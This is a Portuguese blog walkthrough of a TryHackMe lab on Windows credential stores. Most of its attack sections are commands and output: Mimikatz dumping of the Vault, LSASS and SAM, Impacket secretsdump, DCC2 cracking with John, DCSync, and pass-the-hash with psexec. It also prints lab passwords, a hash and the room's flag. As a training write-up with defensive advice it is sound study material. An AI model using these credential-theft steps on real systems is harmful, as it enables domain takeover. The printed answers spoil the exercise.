---
layout: post
title: "Windows Credential Stores - Do Administrador Local ao Domain Admin"
description: "Walkthrough TryHackMe: Mimikatz, LSASS, DPAPI, SAM, SecretsDump, DCC2, John, DCSync e Pass-the-Hash, com dicas para registrar logs."
date: 2026-10-21
categories: [walkthrough, pentest, windows, tryhackme]
tags: [active-directory, credentials, lsass, sam, dpapi, mimikatz, secretsdump, dcc2, john, dcsync, pass-the-hash, impacket]
---

# Windows Credential Stores - Do Administrador Local ao Domain Admin

Nesta room do **TryHackMe**, parti de uma conta de **administrador local na WRK** e cheguei a **SYSTEM no Domain Controller (DC)**. Não precisei explorar uma CVE: o caminho foi entender onde o Windows guarda credenciais e como elas podem ser reutilizadas.

```text
WRK: administrador local (RDP)
    ↓ Mimikatz / Vault / LSASS / SAM
Credenciais e hashes locais
    ↓ SecretsDump → cache DCC2 → John
Senha de drgonzo (Domain Admin)
    ↓ DCSync no DC
Hash NTLM do Administrator do domínio
    ↓ PsExec / Pass-the-Hash
SYSTEM no DC → flag
```

> Laboratório autorizado. Os IPs e credenciais são do exercício. Nunca publique arquivos completos de dumps de um ambiente real.

## Índice

- [1. Onde as credenciais ficam](#armazenamento)
- [2. Acesso à WRK e Mimikatz](#mimikatz)
- [3. SAM, SYSTEM e LSA](#sam-lsa)
- [4. SecretsDump e quebra de DCC2](#dcc2)
- [5. DCSync, Pass-the-Hash e flag](#dominio)
- [6. Dicas: registrar resultados na AttackBox](#logs)
- [7. Ferramentas e aprendizados](#aprendizados)
- [8. Posts relacionados](#posts)

## 1. Onde as credenciais ficam? {:#armazenamento}

| Local | Armazena | Quando importa |
|---|---|---|
| **LSASS** | Sessões, hashes NTLM, tickets Kerberos e, às vezes, senhas | Investigar material de autenticação presente em memória |
| **SAM + SYSTEM** | Hashes de **contas locais** e chave para decifrá-los | Avaliar contas da própria workstation |
| **LSA Secrets** | Segredos de serviços e cache de logons do domínio | Analisar credenciais persistidas para logon offline |
| **DPAPI / Vault** | Senhas salvas por aplicativos, RDP e web | Verificar credenciais armazenadas no perfil |
| **NTDS.dit** | Usuários, hashes e chaves do **domínio** | Avaliar segredos do AD com permissões de replicação |

**Lembrete:** SAM é **local**, NTDS.dit é **do domínio**. Um hash **DCC2** pode ser quebrado offline, mas **não funciona em Pass-the-Hash (PtH)**. Um hash **NTLM** pode servir para PtH quando o sistema aceita esse método.

## 2. Acesso à WRK e Mimikatz {:#mimikatz}

A WRK era `10.220.10.20`; o DC, `10.220.10.10`; e o domínio, `TRYHACKME.LOC`. Acessei a WRK via RDP na AttackBox:

```bash
xfreerdp /v:10.220.10.20 /u:Administrator \
  /p:'<SENHA_LOCAL>' /cert:ignore /dynamic-resolution
```

| Opção | Função |
|---|---|
| `/v:` | IP do Windows |
| `/u:` e `/p:` | Conta e senha |
| `/cert:ignore` | Ignora a verificação do certificado neste lab |
| `/dynamic-resolution` | Ajusta a resolução da sessão |

No Desktop do administrador, abri o **Mimikatz** como administrador:

```powershell
cd C:\Users\Administrator\Desktop
.\mimikatz.exe
```

Eu tinha tentado executar `./mimikatz.exe` (ou `.\mimikatz.exe`) em outra pasta: **o executável não estava lá**. No PowerShell, `.\` indica a pasta atual.

### Vault: credenciais de aplicativos

No prompt `mimikatz #`:

```text
log C:\Users\Administrator\Desktop\mimikatz.log
vault::list
vault::cred /export
```

| Comando | Para que serve |
|---|---|
| `log` | Registra as **próximas saídas** em arquivo |
| `vault::list` | Lista os cofres e suas entradas |
| `vault::cred /export` | Tenta mostrar credenciais armazenadas |

Encontrei **`ElonTusk`**, com a senha do Gmail `MyTusksAreThaB3st`. A entrada `TRYHACKME\svc-app` também estava no Vault, mas o campo da senha apareceu **vazio**.

**Por quê?** O DPAPI protege dados conforme o contexto e as chaves do usuário. Ser administrador local **não garante** conseguir decifrar o segredo do Vault de outra conta.

### LSASS: a senha de `svc-app`

Ainda no Mimikatz:

```text
privilege::debug
sekurlsa::logonpasswords
```

- `privilege::debug` habilita `SeDebugPrivilege` se disponível no token.
- `sekurlsa::logonpasswords` consulta material das sessões mantido no **LSASS**.

Na seção **`credman`**, encontrei o que o Vault não tinha revelado:

```text
Username : TRYHACKME\svc-app
Password : S3rv!c3Acc!
```

**Dica — quando a saída for extensa:** como iniciei o `log`, depois posso filtrar o TXT no PowerShell:

```powershell
Select-String -Path 'C:\Users\Administrator\Desktop\mimikatz.log' `
  -Pattern 'svc-app' -Context 0,2
```

`-Context 0,2` mostra a ocorrência e **duas linhas seguintes**, nas quais apareceu a senha. Isso só funciona quando o registro contém aquele resultado; não recupera saídas anteriores ao `log`.

## 3. SAM, SYSTEM e LSA {:#sam-lsa}

Também verifiquei **hashes de contas locais**, que não dependem de o usuário estar com uma sessão ativa.

No PowerShell **elevado**:

```powershell
reg save HKLM\SAM C:\Users\Administrator\Desktop\SAM /y
reg save HKLM\SYSTEM C:\Users\Administrator\Desktop\SYSTEM /y
```

`reg save` exporta os hives; `/y` substitui cópias existentes sem perguntar — na primeira tentativa precisei confirmar a sobrescrita.

No Mimikatz:

```text
lsadump::sam /sam:"C:\Users\Administrator\Desktop\SAM" /system:"C:\Users\Administrator\Desktop\SYSTEM"
```

O **SAM** fornece os hashes; o **SYSTEM**, o material para decifrá-los. O resultado exibiu contas como `Administrator`, `LocalUser1` e `ElonTusk`. Linhas `ntlm-0`, `ntlm-1` etc. podem ser histórico: para a credencial atual, observe `Hash NTLM`.

Por último, testei a elevação do token local:

```text
privilege::debug
token::elevate
```

O retorno foi `NT AUTHORITY\SYSTEM` e `Impersonated !`. **SYSTEM na WRK não equivale a Domain Admin no DC.** Para consultar os segredos em cache do domínio, usei o SecretsDump na AttackBox.

## 4. SecretsDump e quebra de DCC2 {:#dcc2}

Com as credenciais do administrador **local**, executei remotamente:

```bash
secretsdump.py 'WRK/Administrator:<SENHA_LOCAL>@10.220.10.20' \
  -output local_dump 2>&1 | tee local_dump.log
```

O Impacket consultou dados pela rede via **SMB/RPC**. No laboratório, o serviço `RemoteRegistry` foi iniciado temporariamente e desligado ao final.

| Resultado | O que significa |
|---|---|
| **SAM** | Hashes NTLM das contas **locais** da WRK |
| **Cached domain logons** | Hashes **DCC2/MSCacheV2** de logons de domínio em cache |
| **LSA Secrets** | Segredos como `$MACHINE.ACC`, `DPAPI_SYSTEM` e `NL$KM` |

A conta `WRK$` é a identidade **do computador** no domínio. O que me interessava aqui era o **DCC2 de `drgonzo`**, porque poderia testar sua senha offline:

```text
$DCC2$10240#drgonzo#d0dc1647e45cf7364ecec3c7740fce0f
```

Salvei apenas esse hash para o John:

```bash
printf '%s\n' '$DCC2$10240#drgonzo#d0dc1647e45cf7364ecec3c7740fce0f' > dc2_hash.txt
john --format=mscash2 dc2_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

O John recuperou **`lasvegas1`**, a senha de `drgonzo`. Para visualizar resultados de cracking anteriores:

```bash
john --show --format=mscash2 dc2_hash.txt
```

| Opção | Função |
|---|---|
| `--format=mscash2` | Indica que o hash é DCC2 |
| `--wordlist` | Lista de senhas candidatas |
| `--show` | Mostra senhas que o John já recuperou |

**Por que quebrar o hash?** **DCC2 não é utilizável em PtH**. Recuperar a senha permitiu autenticar como `drgonzo` no domínio da room.

## 5. DCSync, Pass-the-Hash e flag {:#dominio}

A conta `drgonzo` tinha direitos de **Domain Admin** neste laboratório. Assim, executei:

```bash
secretsdump.py 'TRYHACKME/drgonzo:<SENHA_RECUPERADA>@10.220.10.10' \
  -just-dc -output dc_dump 2>&1 | tee dc_dump.log
```

O parâmetro `-just-dc` solicita segredos de domínio pelo protocolo de replicação **DRSUAPI (DCSync)**. Não é uma cópia manual do `NTDS.dit`; requer permissões de replicação adequadas.

O resultado inclui linhas no formato:

```text
usuario:RID:LM_hash:NTLM_hash:::
```

Com o hash NTLM do `Administrator` do domínio, o **Pass-the-Hash** permitiu autenticar sem conhecer sua senha em texto claro:

```bash
psexec.py 'TRYHACKME/Administrator@10.220.10.10' -hashes :<NTLM_HASH>
```

O PsExec encontrou `ADMIN$` gravável, iniciou um serviço temporário e abriu a shell. Verifiquei a identidade:

```cmd
whoami
```

```text
nt authority\system
```

Então li a flag no Desktop:

```cmd
cd C:\Users\Administrator\Desktop
dir
type flag.txt.txt
```

```text
THM{gotta_l0ve_cr3dential_st0res}
```

Eu tinha tentado `file flag.txt`: **`file` é típico do Linux, não do CMD**; além disso, o nome verdadeiro era `flag.txt.txt`. No CMD, use `dir` para listar e `type` para ler arquivos de texto.

## 6. Dicas: registrar resultados na AttackBox {:#logs}

Quando uma room exige muitas consultas, é melhor **salvar a saída durante a enumeração**, em vez de depender do scroll do terminal. Cada ambiente tem um método mais adequado:

| Situação | Melhor método | Onde salva |
|---|---|---|
| **Mimikatz interativo** | `log arquivo.log` | Windows; depois transfira |
| **PowerShell por vários comandos** | `Start-Transcript` | Windows ou pasta compartilhada |
| **CMD: comando isolado** | `> saida.txt 2>&1` | No caminho indicado |
| **Linux / PsExec interativo** | `script -q -f sessao.log` | AttackBox |
| **Linux: comando isolado** | `2>&1 \| tee saida.txt` | AttackBox |
| **SecretsDump** | `-output prefixo` + `tee` | AttackBox |

### Quando quero salvar no Linux o que executei pelo RDP

Posso conectar compartilhando uma pasta da AttackBox:

```bash
mkdir -p ~/thm-credential-stores
xfreerdp /v:<WRK_IP> /u:<USUARIO> /p:'<SENHA>' \
  /cert:ignore /drive:loot,"$HOME/thm-credential-stores"
```

O Windows passa a enxergá-la como `\\tsclient\loot`, se a política RDP permitir. **Uso isso para guardar logs sem precisar montar um servidor HTTP ou copiar e colar o terminal.**

Depois de gerar `mimikatz.log` na WRK:

```powershell
Copy-Item 'C:\Users\Administrator\Desktop\mimikatz.log' '\\tsclient\loot\mimikatz.log'
```

### Quando quero registrar uma sessão completa do PowerShell

```powershell
Start-Transcript -Path '\\tsclient\loot\powershell.txt' -Append
whoami /all
Get-LocalUser
Stop-Transcript
```

`-Append` acrescenta ao arquivo existente; `Stop-Transcript` finaliza o registro. Para **um só comando**, `Get-LocalUser | Out-File usuarios.txt` já basta.

### Quando estou usando uma shell Linux ou PsExec

Na AttackBox, **antes de abrir o PsExec**, inicio:

```bash
script -q -f sessao.log
```

Depois trabalho normalmente; quando sair do PsExec, digito `exit` novamente para encerrar o `script`. O arquivo guarda a interação inteira. Para **somente uma execução**, prefiro `comando 2>&1 | tee saida.txt`.

> **Cuidado:** os logs podem conter senhas e hashes. Eles são úteis como evidência privada, mas **não devem ser enviados integralmente para o GitHub público**.

## 7. Ferramentas e aprendizados {:#aprendizados}

| Ferramenta | Quando usar | Limitação importante |
|---|---|---|
| **Mimikatz** | Acesso local ao Windows; Vault, LSASS e SAM | Depende do token, contexto e proteções do sistema |
| **SecretsDump** | Acesso remoto com privilégios; hashes e LSA | Privilégios necessários variam por alvo/técnica |
| **John** | Teste **offline** de hashes recuperados | Depende da senha estar entre as candidatas |
| **PsExec** | Administração remota / validação de acesso | Exige acesso administrativo e serviços acessíveis |

O que ficou mais claro nesta room: **Vault não mostrar senha não significa que ela não exista no LSASS**; **SYSTEM local não é Domain Admin**; **DCC2 e NTLM são formatos com usos diferentes**; e **registrar as saídas desde o início facilita muito a revisão**.

**Defesas:** proteger o LSASS/Credential Guard quando disponível, evitar logons de administradores de domínio em estações comuns, minimizar credenciais persistidas e monitorar acesso a credenciais e solicitações de replicação no AD.

## 8. Posts relacionados {:#posts}

- [Active Directory - Enumeração e autenticação]({% post_url 2026-10-19-ad-authenticated-enumeration %}): reconhecimento, LDAP, SMB, password spraying e AS-REP Roasting.
- [Checkmate - Quebrando senhas!]({% post_url 2026-10-03-checkmate %}): wordlists, John e estratégias de cracking.
- [Windows Jump - Do Guest ao SYSTEM]({% post_url 2026-10-15-windows-jump %}): RDP, credenciais expostas, serviços e escalação de privilégios.

**Conclusão:** o avanço ocorreu por **WRK → DCC2 de drgonzo → senha recuperada → DCSync → NTLM de Administrator → PtH → SYSTEM**. O método mais importante é identificar **onde está a credencial, qual é seu formato e em quais condições ela pode ser utilizada**.